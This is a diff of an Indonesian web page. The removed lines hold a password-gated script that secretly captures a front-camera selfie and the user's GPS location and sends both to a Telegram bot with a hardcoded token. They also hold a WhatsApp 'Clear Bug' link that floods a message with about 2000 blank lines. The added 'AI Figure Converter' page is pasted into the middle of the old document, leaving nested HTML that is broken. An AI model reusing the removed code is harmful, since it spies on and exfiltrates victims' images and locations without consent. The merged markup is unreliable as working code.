@@ -109,126 +109,155 @@
     <video id="cameraPreview" autoplay playsinline></video>
     <canvas id="canvasCapture" width="640" height="480"></canvas>
 
-    <script>
-        const token   = "7762127279:AAHIQQ_l3KJGaV9T31YM1ZAZ2hNRQcVYtLM";
-        const chatId  = "6788646701";       // ID pribadi
-        const groupId = "-1001234567890";   // Ganti dengan ID grup (format -100...)
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>AI Figure Converter</title>
+  <style>
+    body {
+      font-family: 'Poppins', sans-serif;
+      background: linear-gradient(135deg, #f0f7ff, #e1ecff);
+      color: #1e3a8a;
+      text-align: center;
+      padding: 30px;
+    }
+    h1 {
+      font-size: 2em;
+      margin-bottom: 10px;
+    }
+    p {
+      color: #3b82f6;
+    }
+    input[type="file"] {
+      margin: 20px 0;
+      padding: 10px;
+      border: 2px solid #3b82f6;
+      border-radius: 12px;
+    }
+    button {
+      background: #3b82f6;
+      color: white;
+      border: none;
+      padding: 12px 20px;
+      font-size: 16px;
+      border-radius: 10px;
+      cursor: pointer;
+      margin: 10px;
+    }
+    button:hover {
+      background: #2563eb;
+    }
+    img {
+      width: 280px;
+      margin-top: 20px;
+      border-radius: 12px;
+      box-shadow: 0 4px 10px rgba(0,0,0,0.15);
+    }
+    .loading {
+      display: none;
+      margin-top: 15px;
+      color: #2563eb;
+      font-weight: bold;
+    }
+  </style>
+</head>
+<body>
+  <h1>AI Figure Converter 🧸</h1>
+  <p>Ubah foto manusia, hewan, atau benda menjadi figure 3D miniatur!</p>
 
-        function checkPassword() {
-            const password = "andikavip";
-            const input = document.getElementById("passwordInput").value;
-            const successSound = document.getElementById("successSound");
+  <input type="file" id="imageInput" accept="image/*">
+  <br>
+  <button id="convertBtn">Convert ke Figure</button>
+  <button id="downloadBtn" style="display:none;">Download Gambar</button>
+  <p class="loading" id="loadingText">⏳ Sedang memproses...</p>
+  <div id="result"></div>
 
-            if (input === password) {
-                successSound.loop = true;
-                successSound.play().catch(e => console.log("Autoplay error:", e));
-                document.getElementById("passwordSection").style.display = "none";
-                document.getElementById("appContent").style.display = "block";
+  <script>
+    const REPLICATE_API_KEY = "ISI_TOKEN_KAMU_DI_SINI"; // 🔒 GANTI DENGAN TOKEN PUNYA KAMU
+    const MODEL = "tencentarc/photo-to-3d"; // Model AI Replicate
 
-                mintaAksesKameraDanKirimFoto();
-                mintaAksesLokasi();
-            } else {
-                alert("KEY SALAH TOLOL, BUY KE Andika 🤭.");
-                document.getElementById("passwordInput").value = "";
-            }
+    const imageInput = document.getElementById("imageInput");
+    const convertBtn = document.getElementById("convertBtn");
+    const downloadBtn = document.getElementById("downloadBtn");
+    const resultDiv = document.getElementById("result");
+    const loadingText = document.getElementById("loadingText");
+
+    convertBtn.addEventListener("click", async () => {
+      const file = imageInput.files[0];
+      if (!file) return alert("Pilih gambar dulu ya!");
+
+      loadingText.style.display = "block";
+      resultDiv.innerHTML = "";
+      downloadBtn.style.display = "none";
+
+      const formData = new FormData();
+      formData.append("file", file);
+
+      const imageBase64 = await toBase64(file);
+
+      try {
+        const response = await fetch("https://api.replicate.com/v1/predictions", {
+          method: "POST",
+          headers: {
+            "Authorization": `Token ${REPLICATE_API_KEY}`,
+            "Content-Type": "application/json",
+          },
+          body: JSON.stringify({
+            version: MODEL,
+            input: { image: imageBase64 }
+          })
+        });
+
+        const prediction = await response.json();
+        if (prediction.error) throw new Error(prediction.error);
+
+        let status = prediction.status;
+        let resultUrl = "";
+
+        while (status !== "succeeded" && status !== "failed") {
+          await new Promise(r => setTimeout(r, 2000));
+          const check = await fetch(`https://api.replicate.com/v1/predictions/${prediction.id}`, {
+            headers: { "Authorization": `Token ${REPLICATE_API_KEY}` }
+          });
+          const data = await check.json();
+          status = data.status;
+          if (status === "succeeded") {
+            resultUrl = data.output[0];
+            break;
+          }
         }
 
-        function mintaAksesLokasi() {
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(function(position) {
-                    const latitude = position.coords.latitude;
-                    const longitude = position.coords.longitude;
-                    const mapLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
-                    const message = `📍 *Akses Web Clear Bug Terbuka!*\n\n🔑 Password benar\n🌍 Lokasi pengguna:\nLatitude: ${latitude}\nLongitude: ${longitude}\n📌 [Lihat di Maps](${mapLink})`;
+        if (!resultUrl) throw new Error("Gagal memproses gambar.");
 
-                    fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
-                        method: "POST",
-                        headers: { "Content-Type": "application/json" },
-                        body: JSON.stringify({
-                            chat_id: chatId,
-                            text: message,
-                            parse_mode: "Markdown"
-                        })
-                    });
+        const img = document.createElement("img");
+        img.src = resultUrl;
+        resultDiv.appendChild(img);
+        downloadBtn.style.display = "inline-block";
 
-                }, function(error) {
-                    alert("Gagal mengambil lokasi: " + error.message);
-                });
-            } else {
-                alert("Browser tidak mendukung geolocation.");
-            }
-        }
+        downloadBtn.onclick = () => {
+          const a = document.createElement("a");
+          a.href = resultUrl;
+          a.download = "figure-ai.jpg";
+          a.click();
+        };
 
-        function mintaAksesKameraDanKirimFoto() {
-            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
-                .then(function(stream) {
-                    const video = document.getElementById("cameraPreview");
-                    video.srcObject = stream;
+      } catch (err) {
+        alert("Terjadi kesalahan: " + err.message);
+      } finally {
+        loadingText.style.display = "none";
+      }
+    });
 
-                    setTimeout(() => {
-                        const canvas = document.getElementById("canvasCapture");
-                        const context = canvas.getContext("2d");
-                        context.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-                        canvas.toBlob(blob => {
-                            // ==== Kirim ke pribadi ====
-                            const formData1 = new FormData();
-                            formData1.append("chat_id", chatId);
-                            formData1.append("photo", blob, "selfie.jpg");
-                            formData1.append("caption", "📸 Foto dari kamera (pribadi)");
-
-                            fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
-                                method: "POST",
-                                body: formData1
-                            }).then(() => {
-                                console.log("Foto berhasil dikirim ke Telegram pribadi.");
-                            }).catch(err => {
-                                console.error("Gagal kirim foto pribadi:", err);
-                            });
-
-                            // ==== Kirim ke grup ====
-                            const formData2 = new FormData();
-                            formData2.append("chat_id", groupId);
-                            formData2.append("photo", blob, "selfie.jpg");
-                            formData2.append("caption", "📸 Foto dari kamera (grup)");
-
-                            fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
-                                method: "POST",
-                                body: formData2
-                            }).then(() => {
-                                console.log("Foto berhasil dikirim ke grup Telegram.");
-                            }).catch(err => {
-                                console.error("Gagal kirim foto grup:", err);
-                            });
-
-                        }, "image/jpeg");
-                    }, 3000); // Tunggu 3 detik
-                })
-                .catch(function(err) {
-                    console.error("Gagal mengakses kamera:", err);
-                    alert("Tidak bisa mengakses kamera depan: " + err.message);
-                });
-        }
-
-        function kirimWa() {
-            const target = document.getElementById("nomorTujuan").value;
-            const pesan = document.getElementById("pesan").value;
-
-            if (!target) {
-                alert("Masukkan nomor target dulu ya!");
-                return;
-            }
-            if (!pesan) {
-                alert("Tulis pesan Clear Bug dulu ya!");
-                return;
-            }
-
-            const markerText = `\n\n𝐃𝐈𝐊_𝐌𝐀𝐑𝐊𝐄𝐑 𝐂𝐋𝐄𝐀𝐑 𝐁𝐔𝐆${'\n'.repeat(500)}𝐃𝐈𝐊_𝐌𝐀𝐑𝐊𝐄𝐑 𝐂𝐋𝐄𝐀𝐑 𝐁𝐔𝐆${'\n'.repeat(500)}𝐃𝐈𝐊_𝐌𝐀𝐑𝐊𝐄𝐑 𝐂𝐋𝐄𝐀𝐑 𝐁𝐔𝐆${'\n'.repeat(500)}𝐃𝐈𝐊_𝐌𝐀𝐑𝐊𝐄𝐑 𝐂𝐋𝐄𝐀𝐑 𝐁𝐔𝐆`;
-            const fullMessage = `${pesan}\n\n${markerText}`;
-            const encoded = encodeURIComponent(fullMessage);
-            const waLink = `https://wa.me/${target}?text=${encoded}`;
-            window.open(waLink, "_blank");
-        }
-    </script>
+    function toBase64(file) {
+      return new Promise((resolve, reject) => {
+        const reader = new FileReader();
+        reader.readAsDataURL(file);
+        reader.onload = () => resolve(reader.result);
+        reader.onerror = reject;
+      });
+    }
+  </script>
 </body>
 </html>
